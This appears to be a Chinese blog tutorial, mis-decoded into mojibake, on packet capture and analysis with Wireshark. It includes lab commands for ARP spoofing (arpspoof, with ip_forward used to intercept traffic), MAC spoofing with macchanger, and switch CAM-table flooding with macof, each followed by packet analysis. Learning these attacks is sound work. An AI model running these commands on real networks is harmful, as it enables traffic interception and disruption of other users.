srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="ä¿®æ”¹wiresharké»˜è®¤é…ç½®"><a href="#ä¿®æ”¹wiresharké»˜è®¤é…ç½®" class="headerlink" title="ä¿®æ”¹wiresharké»˜è®¤é…ç½®"></a>ä¿®æ”¹wiresharké»˜è®¤é…ç½®</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623841618-e72dfc53-1370-4b9d-a2d5-dd8d98591861.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=976&size=317484&status=done&style=none&width=488" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623841618-e72dfc53-1370-4b9d-a2d5-dd8d98591861.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=976&size=317484&status=done&style=none&width=488" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h1 id="Wireshark-ç½‘ç»œåˆ†æ"><a href="#Wireshark-ç½‘ç»œåˆ†æ" class="headerlink" title="Wireshark ç½‘ç»œåˆ†æ"></a>Wireshark ç½‘ç»œåˆ†æ</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405807703-705be97f-0b00-41f6-a125-f9e3d7051779.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405807703-705be97f-0b00-41f6-a125-f9e3d7051779.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="># Wireshark éƒ¨ç½²æ–¹å¼</p><h2 id="è¿œç¨‹æ•°æ®åŒ…æ•è·"><a href="#è¿œç¨‹æ•°æ®åŒ…æ•è·" class="headerlink" title="è¿œç¨‹æ•°æ®åŒ…æ•è·"></a>è¿œç¨‹æ•°æ®åŒ…æ•è·</h2><h3 id="æ–¹å¼1"><a href="#æ–¹å¼1" class="headerlink" title="æ–¹å¼1:"></a>æ–¹å¼1:</h3><p>å¼€å¯è¿œç¨‹æ¡Œé¢ï¼ŒrdpæœåŠ¡ï¼Œåœ¨ç³»ç»Ÿä¸­å®‰è£…wiresharkè¿›è¡ŒæŠ“åŒ…åˆ†æ<br>ç¼ºç‚¹: åœ¨äºè¿œç¨‹ç™»å½•è¿‡ç¨‹ä¸­ï¼Œéƒ½ä¼šäº§ç”Ÿæ— å…³ä¸ç›®çš„è¿œç¨‹è¿æ¥æ•°æ®æµé‡</p><h3 id="æ–¹å¼2-wireshark-è¿œç¨‹æŠ“åŒ…"><a href="#æ–¹å¼2-wireshark-è¿œç¨‹æŠ“åŒ…" class="headerlink" title="æ–¹å¼2: wireshark è¿œç¨‹æŠ“åŒ…"></a>æ–¹å¼2: wireshark è¿œç¨‹æŠ“åŒ…</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>æœåŠ¡ç«¯: <a href="https://www.winpcap.org/install/">winpcap</a> -&gt; rpcapd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files (x86)\WinPcap\&quot;</span></span><br><span class="line"><span class="string">.\rpcapd.exe -n</span></span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯: wireshark<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605676732054-bd608dd9-be39-4dfb-91af-3002a9de591c.png#align=left&display=inline&height=888&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1775&originWidth=2206&size=596392&status=done&style=none&width=1103" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605676732054-bd608dd9-be39-4dfb-91af-3002a9de591c.png#align=left&display=inline&height=888&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1775&originWidth=2206&size=596392&status=done&style=none&width=1103" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605678302231-aaa5d801-10bd-4863-8f5f-07fd6d7265c3.png#align=left&display=inline&height=467&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1902&size=98173&status=done&style=none&width=951" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605678302231-aaa5d801-10bd-4863-8f5f-07fd6d7265c3.png#align=left&display=inline&height=467&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1902&size=98173&status=done&style=none&width=951" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h4 id="macos"><a href="#macos" class="headerlink" title="macos"></a>macos</h4><p>æ³¨æ„ macos ç‰ˆæœ¬æ²¡æœ‰ç›´æ¥æŠ“å–æ•°æ®åŒ…çš„åŠŸèƒ½ï¼Œå¯å‚è€ƒ<br><a href="https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/">https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/</a></p><h2 id="æœ¬åœ°æ•°æ®åŒ…æ•è·"><a href="#æœ¬åœ°æ•°æ®åŒ…æ•è·" class="headerlink" title="æœ¬åœ°æ•°æ®åŒ…æ•è·"></a>æœ¬åœ°æ•°æ®åŒ…æ•è·</h2><p>wireshark ä¸èƒ½æŠ“å–æœ¬åœ°ç¯å›ç½‘å¡æ•°æ®åŒ…<br>ä¸è¿‡å¯ä»¥ä½¿ç”¨ RawCap<br><a href="https://www.netresec.com/?page=RawCap">https://www.netresec.com/?page=RawCap</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmd</span></span><br><span class="line">RawCap.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605699228594-f4ee4760-57be-4837-b267-5780e1042f6d.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=906&size=39166&status=done&style=none&width=453" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605699228594-f4ee4760-57be-4837-b267-5780e1042f6d.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=906&size=39166&status=done&style=none&width=453" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>ç„¶åæµè§ˆå™¨è®¿é—® localhost</p><p>ä¸è¿‡å¯ä»¥é€šè¿‡è®¿é—®æœ¬æœº ip ä»£æ›¿ localhost é—´æ¥æ‰å–æ•°æ®åŒ…ï¼ˆç‹—å¤´</p><h2 id="è™šæ‹Ÿæœºæ•°æ®åŒ…æ•è·"><a href="#è™šæ‹Ÿæœºæ•°æ®åŒ…æ•è·" class="headerlink" title="è™šæ‹Ÿæœºæ•°æ®åŒ…æ•è·"></a>è™šæ‹Ÿæœºæ•°æ®åŒ…æ•è·</h2><p>é€‰æ‹©å¯¹åº”ç½‘å¡å³å¯ã€‚ã€‚ã€‚</p><p>æ¯”å¦‚åœ¨ kali ä¸Šè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.18.1/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605704939792-bee30349-ecf6-4996-84d7-d48187d111e0.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=604&originWidth=1702&size=239244&status=done&style=none&width=851" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605704939792-bee30349-ecf6-4996-84d7-d48187d111e0.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=604&originWidth=1702&size=239244&status=done&style=none&width=851" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å“ˆå“ˆå“ˆå“ˆï¼ŒåŸæ¥arpå¹¿æ’­è¿˜çœŸå°±è¿™ä¹ˆç›´ç™½ï¼Œï¼ŒWho has â€¦.? Tell â€¦ï¼ˆnetdiscover è¿˜çœŸç›´ç™½</p><h2 id="ARPæ¬ºéª—æ•è·æ•°æ®åŒ…"><a href="#ARPæ¬ºéª—æ•è·æ•°æ®åŒ…" class="headerlink" title="ARPæ¬ºéª—æ•è·æ•°æ®åŒ…"></a>ARPæ¬ºéª—æ•è·æ•°æ®åŒ…</h2><h3 id="æ”»å‡»åŸåˆ™"><a href="#æ”»å‡»åŸåˆ™" class="headerlink" title="æ”»å‡»åŸåˆ™"></a><a href="https://blog.csdn.net/rectsuly/article/details/63261412">æ”»å‡»åŸåˆ™</a></h3><ul><li>ä»»ä½•ä¸»æœºå‡èƒ½å‘é€ä¼ªé€ åŒ…ç»™å±€åŸŸç½‘ä¸­çš„å¦ä¸€ä¸»æœºï¼›</li><li>ä»»ä¸€ä¸»æœºç›¸ä¿¡å®ƒä»¬æ¥å—åˆ°çš„æ‰€æœ‰åŒ…ï¼›</li><li>å½“ä¸€ä¸ªæ–°çš„å“åº”åŒ…åˆ°è¾¾æ—¶ï¼Œå®ƒç”šè‡³åœ¨æ²¡æœ‰è¯·æ±‚åŒ…è¢«å‘é€çš„æƒ…å†µä¸‹è¦†ç›–æ‰æ—§çš„è®°å½•ã€‚</li></ul><h3 id="å®è·µ"><a href="#å®è·µ" class="headerlink" title="å®è·µ"></a>å®è·µ</h3><p>kali ä¸€èˆ¬è¦å…ˆå®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dsniff</span><br></pre></td></tr></table></figure><p>kali ä¸Šè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t &lt;æ¬ºéª—çš„ç›®æ ‡&gt; &lt;æˆ‘æ˜¯è°&gt;</span><br><span class="line"><span class="comment"># å¦‚</span></span><br><span class="line">sudo arpspoof -i eth0 -t 192.168.123.37 192.168.123.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605709097184-f4dc2fbd-0035-4ba3-8516-feef4b2596fc.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=1468&size=72197&status=done&style=none&width=734" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605709097184-f4dc2fbd-0035-4ba3-8516-feef4b2596fc.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=1468&size=72197&status=done&style=none&width=734" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>ç„¶åæ­¤æ—¶åœ¨ <code>192.168.123.37</code> è¿™å°æœºå™¨ä¸Šwireshark é€‰æ‹©ç½‘å¡ eth0ï¼Œå› ä¸ºæ˜¯æ¬ºéª—è¿™ä¸€å¼ ç½‘å¡ï¼Œwireshark ç­›é€‰è¿‡æ»¤å™¨å¡«å…¥ <code>icmp</code> æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç„¶ååœ¨ 192.168.123.37 ä¸Š ping ç½‘å…³</span></span><br><span class="line">ping 192.168.123.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715163193-77424cbc-ce52-41bf-b66d-0342db71c9d9.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1916&size=161118&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715163193-77424cbc-ce52-41bf-b66d-0342db71c9d9.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1916&size=161118&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>ä¼šå‘ç° 192.168.123.1 çš„ mac åœ°å€æ˜¯ kaliçš„ã€‚ã€‚ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715182447-6145d3c6-a889-409e-830e-acafe83dda8b.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=508&originWidth=1414&size=190359&status=done&style=none&width=707" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715182447-6145d3c6-a889-409e-830e-acafe83dda8b.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=508&originWidth=1414&size=190359&status=done&style=none&width=707" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>æ‰€ä»¥åœ¨ <code>192.168.123.37</code> ä¸Šæ˜¯ä¸Šä¸äº†ç½‘çš„ï¼Œé™¤ékaliä¸Šå¼€å¯äº†æ•°æ®åŒ…è½¬å‘ï¼Œå½“ <code>ip_forward</code> ä¸º 0 æ—¶ï¼Œ<code>æ¬ºéª—çš„ç›®æ ‡</code> ä¸Šä¸äº†ç½‘ï¼Œå½“è¯¥å€¼ä¸º <code>1</code> æ—¶ï¼Œä¼šæŠŠ<code>192.168.123.37</code>å‘é€çš„æ•°æ®åŒ…åšè½¬å‘ç»™ç½‘å…³ï¼Œå°±å¯ä»¥æ­£å¸¸ä¸Šç½‘ï¼Œä½†æ˜¯<code>192.168.123.37</code>çš„æ•°æ®åŒ…éƒ½ä¼šç»è¿‡ kaliã€‚<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715282864-12eed658-02cf-489e-8091-dd073306813d.png#align=left&display=inline&height=37&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=848&size=15549&status=done&style=none&width=424" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715282864-12eed658-02cf-489e-8091-dd073306813d.png#align=left&display=inline&height=37&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=848&size=15549&status=done&style=none&width=424" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h1 id="Wireshark-ç½‘ç»œå®‰å…¨"><a href="#Wireshark-ç½‘ç»œå®‰å…¨" class="headerlink" title="Wireshark ç½‘ç»œå®‰å…¨"></a>Wireshark ç½‘ç»œå®‰å…¨</h1><h2 id="é“¾è·¯å±‚å®‰å…¨"><a href="#é“¾è·¯å±‚å®‰å…¨" class="headerlink" title="é“¾è·¯å±‚å®‰å…¨"></a>é“¾è·¯å±‚å®‰å…¨</h2><h3 id="é’ˆå¯¹äºäº¤æ¢æœºçš„å®‰å…¨é—®é¢˜"><a href="#é’ˆå¯¹äºäº¤æ¢æœºçš„å®‰å…¨é—®é¢˜" class="headerlink" title="é’ˆå¯¹äºäº¤æ¢æœºçš„å®‰å…¨é—®é¢˜"></a>é’ˆå¯¹äºäº¤æ¢æœºçš„å®‰å…¨é—®é¢˜</h3><h4 id="MACå¯¹ç§°æ¬ºéª—-â€”â€”-macchange"><a href="#MACå¯¹ç§°æ¬ºéª—-â€”â€”-macchange" class="headerlink" title="MACå¯¹ç§°æ¬ºéª— â€”â€” macchange"></a>MACå¯¹ç§°æ¬ºéª— â€”â€” macchange</h4><p>æ“¦é™¤åªæ˜¯æš‚æ—¶çš„ï¼Œä¸æ˜¯è¦†ç›–åŸæ¥çš„macåœ°å€ï¼Œæœºå™¨é‡å¯åå°±ä¼šæ¢å¤ã€‚<br>é€šè¿‡MACåœ°å€æ¬ºéª—è¾¾åˆ°éšè—çœŸå®ä¸»æœºçš„ç›®çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-e æ”¹å˜çš„æ˜¯åä¸‰å­—èŠ‚ï¼Œå³ä¸æ”¹å˜ç”Ÿäº§å‚å•†</span><br><span class="line">-a åŒä¸€ç±»å‹çš„éšæœºä¾›åº”å•†åœ°å€ ( macchanger --list=Huawei å°±æ˜¯åŒä¸€ç±»å‹ )</span><br><span class="line">-A éšæœºå‚å•†éšæœºåœ°å€</span><br><span class="line">-p æ°¸ä¹…ä¿®æ”¹</span><br><span class="line">-r å®Œå…¨éšæœº</span><br><span class="line">-l æŸ¥çœ‹æ”¯æŒçš„å‚å•†</span><br><span class="line">-b</span><br><span class="line">-m</span><br></pre></td></tr></table></figure><p>è®¾ç½®å‰éœ€è¦å…³é—­ç½‘å¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig eth0 down</span><br><span class="line"><span class="comment"># -m ä¸èƒ½è‡ªå·±å®Œå…¨éšæ„èµ·ï¼Œå¦‚æœå‰ä¸‰å­—èŠ‚ä¸ç¬¦åˆ mac åœ°å€å‘½åè§„èŒƒä¼šæŠ¥é”™</span></span><br><span class="line"><span class="comment"># [ERROR] Could not change MAC: interface up or insufficient permissions: Cannot assign requested address</span></span><br><span class="line">sudo macchanger -m 00:90:d1:33:33:33 eth0</span><br><span class="line">sudo ifconfig eth0 up</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605751171287-967e198f-49e0-4d98-b9f6-c3550f0d7c09.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=128&originWidth=1154&size=36866&status=done&style=none&width=577" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605751171287-967e198f-49e0-4d98-b9f6-c3550f0d7c09.png#align=left&display=inline&height=64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=128&originWidth=1154&size=36866&status=done&style=none&width=577" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>éšæœºåŒ–è®¾ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo macchanger -r eth0</span><br></pre></td></tr></table></figure><h3 id="MACåœ°å€æ³›æ´ªåˆ†æ-â€”â€”-æº¢å‡ºäº¤æ¢æœºCAMè¡¨"><a href="#MACåœ°å€æ³›æ´ªåˆ†æ-â€”â€”-æº¢å‡ºäº¤æ¢æœºCAMè¡¨" class="headerlink" title="MACåœ°å€æ³›æ´ªåˆ†æ â€”â€” æº¢å‡ºäº¤æ¢æœºCAMè¡¨"></a>MACåœ°å€æ³›æ´ªåˆ†æ â€”â€” æº¢å‡ºäº¤æ¢æœºCAMè¡¨</h3><p>äº¤æ¢æœºä¹‹æ‰€ä»¥å¯ä»¥äº¤æ¢æ•°æ®ï¼Œæ˜¯å› ä¸ºäº¤æ¢æœºåœ¨å†…å­˜ä¸­ç»´æŠ¤ç€ä¸€å¼ CAMè¡¨ï¼Œå³ ç«¯å£ &lt;-&gt; MACåœ°å€<br>å½“è¡¨è¢«æ·»æ»¡æ—¶ï¼Œå…¶ä»–ä¸»æœºå°±æ— æ³•åœ¨å¯¹åº”çš„ç«¯å£æ­£å¸¸äº¤äº’æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo macof -h</span><br><span class="line"><span class="comment"># -x æºç«¯å£ -y ç›®çš„ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³›æ´ª</span></span><br><span class="line">sudo macof -i eth0</span><br></pre></td></tr></table></figure><h4 id="wireshark-æŠ“åŒ…åˆ†æ"><a href="#wireshark-æŠ“åŒ…åˆ†æ" class="headerlink" title="wireshark æŠ“åŒ…åˆ†æ"></a>wireshark æŠ“åŒ…åˆ†æ</h4><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756353104-8d3a2f20-b6de-4f3a-96d5-50c27bc73986.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=738&size=30385&status=done&style=none&width=369" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756353104-8d3a2f20-b6de-4f3a-96d5-50c27bc73986.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=738&size=30385&status=done&style=none&width=369" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å› ä¸ºå®é™…ä¸­ï¼Œä¸»è¦æ•°æ®åŒ…ç±»å‹æ˜¯ tcp æˆ– udp<br>ä¸‹é¢åªæœ‰ ip æ•°æ®åŒ…ï¼Œå› æ­¤å¾ˆå¯èƒ½æœ‰é—®é¢˜ï¼ˆå½“ç„¶æœ‰é—®é¢˜ï¼Œå“ˆå“ˆ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756440805-bbc21254-960c-424c-adf5-963ddc384ac3.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1520&size=68067&status=done&style=none&width=760" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756440805-bbc21254-960c-424c-adf5-963ddc384ac3.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1520&size=68067&status=done&style=none&width=760" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756512911-3a0e38b9-c602-4600-b7b2-400c1d8d8bee.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=802&size=40168&status=done&style=none&width=401" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756512911-3a0e38b9-c602-4600-b7b2-400c1d8d8bee.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=802&size=40168&status=done&style=none&width=401" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å¾ˆå¤šæ— å…³çš„ ip ä»¥åŠ macåœ°å€ï¼Œæ•°æ®åŒ…å¾ˆå°<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756581434-8a71bd43-da93-4d75-899b-378666a2ed08.png#align=left&display=inline&height=490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=980&originWidth=1890&size=181036&status=done&style=none&width=945" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756581434-8a71bd43-da93-4d75-899b-378666a2ed08.png#align=left&display=inline&height=490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=980&originWidth=1890&size=181036&status=done&style=none&width=945" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756609002-4cbac7d3-258b-48c0-b32b-3f6a61a3b79f.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=1870&size=215919&status=done&style=none&width=935" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756609002-4cbac7d3-258b-48c0-b32b-3f6a61a3b79f.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=1870&size=215919&status=done&style=none&width=935" 